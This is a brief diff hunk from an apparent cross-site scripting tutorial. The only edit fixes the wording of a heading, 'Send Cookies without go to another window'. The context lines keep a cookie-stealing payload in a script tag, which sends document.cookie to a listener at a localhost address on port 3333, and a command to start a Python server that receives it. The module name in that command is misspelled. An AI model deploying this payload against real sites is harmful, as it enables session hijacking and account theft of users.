@@ -18,7 +18,7 @@ YasserREED > Python3 -m Server.http 3333 <- Any Port You Like!
 <script> window.location='https://127.0.0.1/:3333?cookie='+document.cookie </script> 
 
 
-# Send Cookies with out go another Window :
+# Send Cookies without go to another window :
 
 1- Strat Python Server:
 
